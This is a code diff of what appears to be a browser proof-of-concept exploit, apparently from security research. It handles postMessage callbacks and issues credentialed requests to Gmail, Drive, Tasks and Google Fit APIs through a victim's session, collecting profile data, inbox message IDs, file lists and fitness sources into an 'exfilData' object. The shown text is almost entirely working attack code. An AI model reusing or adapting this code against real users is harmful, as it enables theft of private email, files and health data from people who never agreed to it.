@@ -111,56 +111,63 @@ window.addEventListener('message', function(e) {
     sendRequests();
   }
 
-  // Callback handler
-  if (!msg.f || !msg.f.includes('_callbacks_')) return;
+  // Callback format: {s:"__cb", f:"", a:[callId, responseMapJSON]}
+  // responseMapJSON = JSON string of {"/relative_url": {data:{status,body}}}
+  if (msg.s !== '__cb') return;
 
-  log('ok', 'Callback received: ' + msg.f);
-  const [err, responses] = Array.isArray(msg.a) ? msg.a : [null, null];
+  log('ok', '__cb received, callId=' + msg.a[0]);
+  let responseMap;
+  try { responseMap = JSON.parse(msg.a[1]); } catch(e) {
+    log('warn', 'Failed to parse response: ' + String(msg.a[1]).substring(0, 200)); return;
+  }
 
-  if (err) { log('warn', 'RPC error: ' + JSON.stringify(err)); return; }
-  if (!Array.isArray(responses)) { log('warn', 'No responses array: ' + JSON.stringify(msg.a)); return; }
-
-  const apiNames = ['Gmail Profile', 'Gmail Inbox', 'Drive Files', 'Tasks Lists', 'Google Fit Sources'];
   const exfilData = {};
 
-  responses.forEach((resp, idx) => {
-    if (!resp) { log('warn', '[' + idx + '] null response'); return; }
-    const apiName = apiNames[idx] || 'API-' + idx;
-    log('ok', '[' + idx + '] ' + apiName + ': HTTP ' + resp.status);
+  Object.entries(responseMap).forEach(([relUrl, wrapper]) => {
+    const status = wrapper.data && wrapper.data.status;
+    const bodyStr = wrapper.data && wrapper.data.body;
+    log('ok', relUrl.substring(0,50) + ' → HTTP ' + status);
 
-    if (resp.status === 200 && resp.body) {
+    if (status === 200 && bodyStr) {
       let data;
-      try { data = JSON.parse(resp.body); } catch(e) { data = { raw: resp.body }; }
-      exfilData[apiName] = data;
+      try { data = JSON.parse(bodyStr); } catch(e) { data = { raw: bodyStr }; }
 
-      // Parse and display
-      if (idx === 0 && data.emailAddress) {
+      if (relUrl.includes('/gmail/v1/users/me/profile')) {
         log('crit', '✅ GMAIL PROFILE: ' + data.emailAddress + ' (' + data.messagesTotal + ' messages)');
         addResult('✅ NEW-001: Gmail Profile', data, 'crit');
-      } else if (idx === 1 && data.messages) {
-        log('crit', '✅ GMAIL INBOX: ' + data.messages.length + ' message IDs fetched');
+        exfilData['gmail_profile'] = data;
+        resultsReceived++;
+      } else if (relUrl.includes('/gmail/v1/users/me/messages')) {
+        log('crit', '✅ GMAIL INBOX: ' + (data.messages||[]).length + ' message IDs');
         addResult('✅ NEW-001: Gmail Inbox', data, 'crit');
-      } else if (idx === 2 && data.files) {
-        log('crit', '✅ DRIVE FILES: ' + data.files.length + ' files');
-        data.files.forEach((f, i) => log('data', '  [' + i + '] ' + f.name + ' | ' + f.mimeType));
+        exfilData['gmail_inbox'] = data;
+        resultsReceived++;
+      } else if (relUrl.includes('/drive/v3/files')) {
+        log('crit', '✅ DRIVE FILES: ' + (data.files||[]).length + ' files');
+        (data.files||[]).forEach((f, i) => log('data', '  [' + i + '] ' + f.name + ' | ' + f.mimeType));
         addResult('✅ NEW-005: Drive Files', data, 'crit');
-      } else if (idx === 3 && data.items) {
-        log('crit', '✅ TASKS: ' + data.items.length + ' task lists');
+        exfilData['drive_files'] = data;
+        resultsReceived++;
+      } else if (relUrl.includes('/tasks/v1/')) {
+        log('crit', '✅ TASKS: ' + (data.items||[]).length + ' task lists');
         addResult('✅ NEW-003: Tasks', data, 'crit');
-      } else if (idx === 4 && data.dataSource) {
-        log('crit', '✅ GOOGLE FIT: ' + data.dataSource.length + ' data sources');
+        exfilData['tasks'] = data;
+        resultsReceived++;
+      } else if (relUrl.includes('/fitness/v1/')) {
+        log('crit', '✅ GOOGLE FIT: ' + (data.dataSource||[]).length + ' data sources');
         addResult('✅ NEW-004: Google Fit', data, 'crit');
+        exfilData['fit'] = data;
+        resultsReceived++;
       } else {
-        log('ok', '  Response: ' + JSON.stringify(data).substring(0, 200));
-        addResult(apiName + ' (200 OK)', data, 'ok');
+        log('ok', '  [200] ' + relUrl + ': ' + JSON.stringify(data).substring(0, 200));
+        resultsReceived++;
       }
-      resultsReceived++;
-    } else if (resp.status === 401) {
-      log('warn', '[' + idx + '] ' + apiName + ': 401 — not logged in, or SAPISIDHASH failed');
-    } else if (resp.status === 403) {
-      log('warn', '[' + idx + '] ' + apiName + ': 403 — ' + resp.body);
+    } else if (status === 401) {
+      log('warn', relUrl.substring(0,40) + ': 401 — not logged in or SAPISIDHASH failed');
+    } else if (status === 403) {
+      log('warn', relUrl.substring(0,40) + ': 403 — ' + String(bodyStr).substring(0, 150));
     } else {
-      log('warn', '[' + idx + '] ' + apiName + ': ' + resp.status + ' — ' + String(resp.body).substring(0, 200));
+      log('warn', relUrl.substring(0,40) + ': ' + status + ' — ' + String(bodyStr).substring(0, 150));
     }
   });
 
@@ -183,46 +190,41 @@ function sendRequests() {
   const requests = [
     // NEW-001: Gmail Profile
     {
-      url: '/gmail/v1/users/me/profile',
+      relative_url: '/gmail/v1/users/me/profile',
       method: 'GET',
       headers: {},
-      body: null,
-      responseExpected: true
+      body: null
     },
     // NEW-001: Gmail Inbox (first 10 IDs)
     {
-      url: '/gmail/v1/users/me/messages?maxResults=10&labelIds=INBOX',
+      relative_url: '/gmail/v1/users/me/messages?maxResults=10&labelIds=INBOX',
       method: 'GET',
       headers: {},
-      body: null,
-      responseExpected: true
+      body: null
     },
     // NEW-005: Drive Files
     {
-      url: '/drive/v3/files' +
+      relative_url: '/drive/v3/files' +
            '?key=' + DRIVE_KEY +
            '&fields=files(id,name,mimeType,modifiedTime,size)' +
            '&pageSize=20&orderBy=modifiedTime+desc',
       method: 'GET',
       headers: {},
-      body: null,
-      responseExpected: true
+      body: null
     },
     // NEW-003: Tasks
     {
-      url: '/tasks/v1/users/@me/lists',
+      relative_url: '/tasks/v1/users/@me/lists',
       method: 'GET',
       headers: {},
-      body: null,
-      responseExpected: true
+      body: null
     },
     // NEW-004: Google Fit
     {
-      url: '/fitness/v1/users/me/dataSources',
+      relative_url: '/fitness/v1/users/me/dataSources',
       method: 'GET',
       headers: {},
-      body: null,
-      responseExpected: true
+      body: null
     }
   ];
 
